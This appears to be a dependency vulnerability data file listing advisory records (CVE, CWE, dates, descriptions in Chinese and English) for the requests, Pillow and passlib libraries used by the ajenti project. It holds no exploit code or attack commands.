ajenti_ajenti,requests,,True,,,,<p>Python Requests 是一个用于发送 HTTP 请求的开源库，广泛用于 Web 应用程序中。当请求涉及到公共后缀域的 Set-Cookie 头时，可能会导致 Cookie 被错误地发送到所有公共后缀域。此漏洞的根本原因在于 Python Requests 在处理包含公共后缀的 Cookie 域时，未能正确限制 Cookie 的发送。攻击者可以利用这个漏洞，诱使用户访问特定 URL，从而在请求过程中窃取敏感信息。</p>,2,1
ajenti_ajenti,requests,,True,CVE-2014-1829,CWE-200,2013-12-25,"Requests（也称python-requests）是软件开发者Kenneth Reitz和其他维护贡献者共同开发的一个采用Python语言编写的HTTP客户端库。
Requests 2.3.0之前版本中存在安全漏洞。远程攻击者可通过读取重定向请求中的Authorization头利用该漏洞获取‘netrc’密码。",3,2
ajenti_ajenti,requests,,True,CVE-2018-18074,CWE-522,2018-10-09,"Requests package for Python是一款基于Python的开源HTTP库。
Requests package for Python 2.19.1及之前版本（2018-09-14之前发布）中存在安全漏洞，该漏洞源于程序在接收到从https转换到http的重定向请求（带有相同主机名）时，会将HTTP Authorization包头发送到http URI。远程攻击者可通过嗅探网络利用该漏洞获取凭证。",2,2
ajenti_ajenti,requests,,True,,CWE-400,2012-04-07,"## Overview
[`requests`](https://pypi.python.org/pypi/requests) is a Python HTTP for Humans.

Affected versions of this package are vulnerable to Denial of Service (DoS) attacks. When sending a digest with an incorrect password, it will retry the request for infinity. An attacker can send many of these requests, causing a denial of service.

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## References
- [GitHub Issue](https://github.com/requests/requests/issues/541)
- [GitHub PR](https://github.com/requests/requests/pull/547)
- [GitHub Commit](https://github.com/requests/requests/pull/547/commits/c3e6c41fc164d4348f8ce197bd0075aff05637af)
",3,2
ajenti_ajenti,requests,,True,CVE-2014-1830,CWE-200,2013-12-25,"Requests（也称python-requests）是软件开发者Kenneth Reitz和其他维护贡献者共同开发的一个采用Python语言编写的HTTP客户端库。
Requests 2.3.0之前版本中存在安全漏洞。远程攻击者可通过读取重定向请求中的Proxy-Authorizatio头利用该漏洞获取敏感信息。",3,2
ajenti_ajenti,requests,,True,,CWE-400,2023-11-01,"## Overview

Affected versions of this package are vulnerable to Denial of Service (DoS) due to incorrect password used in conjunction with digest authentication. This can lead to an infinite request retry cycle

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `requests` to version 0.12.0 or higher.
## References
- [GitHub Commit](https://github.com/psf/requests/commit/f3ad56f103e364671504bb0d960a0ed69c2eafbc)
",2,2
ajenti_ajenti,requests,,True,CVE-2024-35195,CWE-670,2024-05-20,"Requests是Python基金会的一个优雅而简单的HTTP库。通过请求，您可以非常轻松地发送HTTP / 1.1请求。无需将查询字符串手动添加到您的URL，也无需对POST数据进行表单编码。
Requests 2.32.0之前版本存在安全漏洞，该漏洞源于禁用证书验证后在连接的生命周期中持续存在，后续所有请求都将被忽略。",3,0
ajenti_ajenti,requests,,True,CVE-2024-47081,CWE-522,2025-06-06,Requests库用于发送HTTP请求的Python库。该漏洞涉及Netrc凭证泄漏，可能导致敏感信息泄露。,3,2
ajenti_ajenti,requests,,True,,,,<p>Python Requests 是一个用于发送 HTTP 请求的开源库，广泛用于 Web 应用程序中。当请求涉及到公共后缀域的 Set-Cookie 头时，可能会导致 Cookie 被错误地发送到所有公共后缀域。此漏洞的根本原因在于 Python Requests 在处理包含公共后缀的 Cookie 域时，未能正确限制 Cookie 的发送。攻击者可以利用这个漏洞，诱使用户访问特定 URL，从而在请求过程中窃取敏感信息。</p>,2,1
ajenti_ajenti,Pillow,,True,,,2023-10-05,"## Duplicate Advisory
This advisory has been withdrawn because it is a duplicate of GHSA-56pw-mpj4-fxww. This link is maintained to preserve external references.

## Original Description
Pillow versions before v10.0.1 bundled libwebp binaries in wheels that are vulnerable to CVE-2023-5129 (previously CVE-2023-4863). Pillow v10.0.1 upgrades the bundled libwebp binary to v1.3.2.",2,-2
ajenti_ajenti,Pillow,,True,,CWE-400,2021-04-24,"### Impact
_Pillow before 8.1.1 allows attackers to cause a denial of service (memory consumption) because the reported size of a contained image is not properly checked for a BLP container, and thus an attempted memory allocation can be very large._

### Patches
_An issue was discovered in Pillow before 6.2.0. When reading specially crafted invalid image files, the library can either allocate very large amounts of memory or take an extremely long period of time to process the image._

### Workarounds
_An issue was discovered in Pillow before 6.2.0. When reading specially crafted invalid image files, the library can either allocate very large amounts of memory or take an extremely long period of time to process the image._

### References
https://nvd.nist.gov/vuln/detail/CVE-2021-27921

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [example link to repo](http://example.com)
* Email us at [example email address](mailto:example@example.com)",2,2
ajenti_ajenti,Pillow,,True,,CWE-400,2022-03-12,"JpegImagePlugin may append an EOF marker to the end of a truncated file, so that the last segment of the data will still be processed by the decoder.

If the EOF marker is not detected as such however, this could lead to an infinite loop where JpegImagePlugin keeps trying to end the file.",4,-2
ajenti_ajenti,Pillow,,True,CVE-2022-45198,CWE-409,2022-11-14,"Pillow是一款基于Python的图像处理库。
Pillow 9.2.0之前版本存在安全漏洞，该漏洞源于对高度压缩的GIF数据处理不当。",2,2
ajenti_ajenti,Pillow,,True,CVE-2020-10994,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/Jpeg2KDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
ajenti_ajenti,Pillow,,True,CVE-2016-4009,CWE-119,2016-04-13,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 3.1.1之前版本的libImaging/Resample.c文件中的‘ImagingResampleHorizontal’函数存在整数溢出漏洞。远程攻击者可借助负的‘new’的大小值利用该漏洞造成拒绝服务（基于堆的缓冲区溢出）。",1,2
ajenti_ajenti,Pillow,,True,CVE-2020-11538,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.0.0及之前版本中的libImaging/SgiRleDecode.c文件的SGI图像文件的处理存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",1,0
ajenti_ajenti,Pillow,,True,CVE-2021-27923,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
ajenti_ajenti,Pillow,,True,CVE-2021-27922,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
ajenti_ajenti,Pillow,,True,CVE-2021-27921,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
ajenti_ajenti,Pillow,,True,CVE-2021-25290,CWE-787,2021-03-11,<p>Pillow是一款基于Python的图像处理库。 Pillow 8.1.1之前版本存在安全漏洞。该漏洞源于在TiffDecode.c中存在一个大小无效的负偏移memcpy。</p>,2,2
ajenti_ajenti,Pillow,,True,CVE-2021-25293,CWE-125,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1版本之前存在安全漏洞。该漏洞源于SGIRleDecode.c中存在越界读取。",2,2
ajenti_ajenti,Pillow,,True,CVE-2021-25291,CWE-125,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1之前版本中存在安全漏洞。该漏洞源于TiffDecode.c在TiffreadRGBATile中通过无效的title越界读取。",2,2
ajenti_ajenti,Pillow,,True,CVE-2020-35653,CWE-125,2021-01-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.0之前版本中存在缓冲区错误漏洞，当解码一个精心制作的PCX文件时，PoxDecode有一个缓冲区过读，因为缓冲区计算信任用户提供的stride值。",2,0
ajenti_ajenti,Pillow,,True,,CWE-78,2020-11-02,"## Overview
[Pillow](https://python-pillow.org/) is a PIL (Python Imaging Library) fork.

Affected versions of this package are vulnerable to Command Injection in filenames that contain single quotes via `load_djpeg`.
## Remediation
Upgrade `Pillow` to version 2.5.0 or higher.
## References
- [GitHub PR](https://github.com/python-pillow/Pillow/pull/748)
- [Pillow Changelog](https://github.com/python-pillow/Pillow/blob/master/CHANGES.rst#250-2014-07-01)
",1,0
ajenti_ajenti,Pillow,,True,CVE-2020-10378,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/PcxDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
ajenti_ajenti,Pillow,,True,CVE-2020-10177,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/FliDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
ajenti_ajenti,Pillow,,True,CVE-2020-5312,CWE-120,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/PcxDecode.c文件存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。远程攻击者可借助特制PCX文件利用该漏洞在系统上执行任意代码。",1,2
ajenti_ajenti,Pillow,,True,CVE-2020-5311,CWE-120,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/SgiRleDecode.c文件存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。远程攻击者可借助特制SGI文件利用该漏洞在系统上执行任意代码，或者导致应用程序崩溃。",1,2
ajenti_ajenti,Pillow,,True,CVE-2020-5313,CWE-125,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/FliDecode.c文件存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。远程攻击者可借助特制FLI文件利用该漏洞在系统上执行任意代码，或者导致应用程序崩溃。",2,0
ajenti_ajenti,Pillow,,True,CVE-2019-16865,CWE-770,2019-10-04,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.0之前版本中存在安全漏洞。攻击者可利用该漏洞造成拒绝服务。",2,2
ajenti_ajenti,Pillow,,True,CVE-2016-9189,CWE-190,2016-11-04,"Pillow是美国软件开发者Alex Clark所研发的一个对PIL（Python图像处理库）一些BUG修正后的编译版。

Pillow 3.3.2之前的版本中存在安全漏洞。上下文相关的攻击者可利用该漏洞获取敏感信息。",3,0
ajenti_ajenti,Pillow,,True,CVE-2016-9190,CWE-284,2016-11-04,"Pillow是美国软件开发者Alex Clark所研发的一个对PIL（Python图像处理库）一些BUG修正后的编译版。

Pillow 3.3.2之前的版本中存在安全漏洞。上下文相关的攻击者可通过使用‘crafted image file’方法利用该漏洞执行任意代码。",2,0
ajenti_ajenti,Pillow,,True,CVE-2016-0775,CWE-119,2016-04-13,"Pillow是一款基于Python的图像处理库。
Pillow 3.1.1之前版本的libImaging/FliDecode.c文件中的‘ImagingFliDecode’函数存在缓冲区错误漏洞。远程攻击者可借助特制的FLI文件利用该漏洞造成拒绝服务（崩溃）。",2,0
ajenti_ajenti,Pillow,,True,CVE-2016-2533,CWE-119,2016-04-13,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 3.1.1之前版本和PIL 1.1.7及之前版本的PcdDecode.c文件中的‘ImagingPcdDecode’函数存在缓冲区溢出漏洞。远程攻击者可借助特制的PhotoCD文件利用该漏洞造成拒绝服务（崩溃）。",2,0
ajenti_ajenti,Pillow,,True,CVE-2014-1932,CWE-59,2014-04-17,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。Pillow是对PIL的一些BUG修正后的编译版。
PIL 1.1.7及之前的版本和Pillow 2.3.0及之前的版本中的JpegImagePlugin.py文件的‘load_djpeg’函数；EpsImagePlugin.py文件的‘Ghostscript’函数；IptcImagePlugin.py文件的‘load’函数；Image.py文件的‘_copy’函数存在安全漏洞，该漏洞源于程序没有正确创建临时文件。本地攻击者可通过对临时文件的符号链接攻击利用该漏洞覆盖任意文件，获取敏感信息。",2,0
ajenti_ajenti,Pillow,,True,CVE-2014-1933,CWE-264,2014-04-17,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。Pillow是对PIL的一些BUG修正后的编译版。
PIL 1.1.7及之前的版本和Pillow 2.3.0及之前的版本中的JpegImagePlugin.py和EpsImagePlugin.py脚本存在安全漏洞，该漏洞源于程序在命令行上使用临时文件名。本地攻击者可利用该漏洞实施符号链接攻击。",3,0
ajenti_ajenti,Pillow,,True,CVE-2016-0740,CWE-119,2016-04-13,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 3.1.1之前版本的libImaging/TiffDecode.c文件中的‘ImagingLibTiffDecode’函数存在缓冲区溢出漏洞。远程攻击者可借助特制的TIFF文件利用该漏洞覆盖内存。",3,0
ajenti_ajenti,Pillow,,True,CVE-2020-10379,CWE-120,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/TiffDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
ajenti_ajenti,Pillow,,True,CVE-2022-24303,CWE-22,2022-02-03,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.1之前版本存在输入验证错误漏洞，该漏洞源于产品的remove操作未验证用户输入数据。攻击者可通过该漏洞利用输入命令来修改或删除预期的命令。",2,2
ajenti_ajenti,Pillow,,True,CVE-2022-22815,CWE-665,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 path.c 中的 path_getbbox 不正确地初始化 ImagePath.Path。",3,2
ajenti_ajenti,Pillow,,True,CVE-2022-22816,CWE-125,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 path.c 中的 path_getbbox 在 ImagePath.Path 初始化期间有一个缓冲区过度读取。",3,2
ajenti_ajenti,Pillow,,True,CVE-2022-22817,CWE-94,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 PIL.ImageMath.eval 允许评估任意表达式，例如使用 Python exec 方法的表达式。",1,2
ajenti_ajenti,Pillow,,True,,CWE-400,2022-01-04,"## Overview
[Pillow](https://python-pillow.org/) is a PIL (Python Imaging Library) fork.

Affected versions of this package are vulnerable to Denial of Service (DoS). The `JpegImagePlugin` may append an EOF marker to the end of a truncated file, so that the last segment of the data will still be processed by the decoder. If the EOF marker is not detected as such, this can lead to an infinite loop where `JpegImagePlugin` keeps trying to end the file.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `Pillow` to version 9.0.0 or higher.
## References
- [GitHub Commit](https://github.com/python-pillow/Pillow/pull/5921/commits/1059eb537639925c96d3245dcd73c106d4266c83)
- [GitHub Issue](https://github.com/python-pillow/Pillow/issues/5864#issuecomment-1003788821)
- [GitHub PR](https://github.com/python-pillow/Pillow/pull/5921)
- [Release Notes](https://pillow.readthedocs.io/en/stable/releasenotes/9.0.0.html#ensure-jpegimageplugin-stops-at-the-end-of-a-truncated-file)
",3,0
ajenti_ajenti,Pillow,,True,CVE-2021-34552,CWE-120,2021-07-13,"Pillow是一款基于Python的图像处理库。
Pillow 中存在缓冲区错误漏洞，该漏洞源于产品的convert .c未能验证参数的安全性，攻击者可通过该漏洞引发缓冲区溢出。以下产品及版本受到影响：Pillow 8.2.0 之前版本、PIL 1.1.7 之前版本。",1,2
ajenti_ajenti,Pillow,,True,CVE-2021-28677,CWE-20,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在输入验证错误漏洞，该漏洞由于在处理换行符（例如在打开文件时使用“  r”，“  n”）时对用户提供的输入的验证不足而存在的。远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,2
ajenti_ajenti,Pillow,,True,CVE-2021-28675,CWE-252,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在资源管理错误漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,0
ajenti_ajenti,Pillow,,True,CVE-2021-28678,CWE-345,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在数据伪造问题漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",3,0
ajenti_ajenti,Pillow,,True,CVE-2021-28676,CWE-835,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在安全漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,2
ajenti_ajenti,Pillow,,True,CVE-2023-50447,CWE-94 CWE-95,2024-01-19,"Pillow是一款基于Python的图像处理库。
Pillow 10.1.0及之前版本存在安全漏洞，该漏洞源于可以通过PIL.ImageMath.eval中的environment 参数执行任意代码。",1,0
ajenti_ajenti,Pillow,,True,CVE-2023-44271,CWE-770,2023-11-03,"Pillow是一款基于Python的图像处理库。
Pillow 10.0.0之前版本存在安全漏洞，该漏洞源于不受控制地分配内存，从而导致服务崩溃。",2,2
ajenti_ajenti,Pillow,,True,CVE-2014-3589,CWE-20,2014-08-20,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
PIL和Pillow 2.3.2之前版本和2.5.2版本之前2.5.x版本的PIL/IcnsImagePlugin.py文件中存在安全漏洞。远程攻击者可通过特制的块数据利用该漏洞造成拒绝服务。",2,2
ajenti_ajenti,Pillow,,True,CVE-2014-3007,CWE-78,2014-04-27,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
PIL 1.1.7及之前的版本和Pillow 2.3版本中存在安全漏洞。远程攻击者可借助shell元字符利用该漏洞执行任意命令。",1,2
ajenti_ajenti,Pillow,,True,CVE-2020-35654,CWE-787,2021-01-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.0之前版本中存在缓冲区错误漏洞，当解码制作好的YCbCr文件时，由于在RGBA模式下与LibTIFF的某些解释冲突，TiffDecode会出现基于堆的缓冲区溢出。",2,0
ajenti_ajenti,Pillow,,True,CVE-2019-19911,CWE-190,2020-01-05,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中存在输入验证错误漏洞。攻击者可利用该漏洞造成拒绝服务（进程终止）。",2,2
ajenti_ajenti,Pillow,,True,CVE-2014-9601,CWE-20,2015-01-16,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 2.7.0之前版本中存在安全漏洞。远程攻击者可借助特制的PNG图像中压缩的文本块利用该漏洞造成拒绝服务。",2,2
ajenti_ajenti,Pillow,,True,CVE-2021-25289,CWE-787,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1之前版本中存在安全漏洞。该漏洞源于在解码精心编制的YCbCr文件时，TiffDecode会出现基于堆的缓冲区溢出。",1,2
ajenti_ajenti,Pillow,,True,CVE-2020-5310,CWE-190,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/TiffDecode.c文件存在输入验证错误漏洞，该漏洞源于程序没有正确分配内存。远程攻击者可借助特制TIFF图像利用该漏洞导致应用程序崩溃。",1,0
ajenti_ajenti,Pillow,,True,CVE-2014-3598,CWE-399,2015-05-01,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。Jpeg2KImage是其中的一个图像处理插件。
PIL 2.5.3之前版本的Jpeg2KImagePlugin插件中存在安全漏洞。远程攻击者可借助特制的图像利用该漏洞造成拒绝服务。",2,2
ajenti_ajenti,Pillow,,True,CVE-2024-28219,CWE-680,2024-04-01,"Pillow是一款基于Python的图像处理库。
Pillow(PIL Fork)存在安全漏洞，该漏洞源于_imagingcms.c中存在缓冲区溢出漏洞。",2,0
ajenti_ajenti,passlib,,True,,CWE-521,2020-05-19,"## Overview

Affected versions of this package are vulnerable to Cryptographic Weakness. The `SHA-256` prehash is unsalted, meaning the resulting `bcrypt` digest is vulnerable to breach correlation attacks.
## Remediation
Upgrade `passlib` to version 1.7.3 or higher.
## References
- [1.7.3 Release Changelog](https://passlib.readthedocs.io/en/stable/history/1.7.html#id1)
- [BitBucket Commit](https://bitbucket.org/ecollins/passlib/commits/bd0da1bdf0fd17b886212649184f2ce3eb8c8329)
- [BitBucket Issue](https://bitbucket.org/ecollins/passlib/issues/114/bcrypt_sha256-is-vulnerable-to-breach)
",3,0
ajenti_ajenti,passlib,,True,,CWE-400,2017-12-04,"## Overview
Affected versions of [`passlib`](https://pypi.python.org/pypi/passlib) are vulnerable to Denial of Service (DoS) attack.

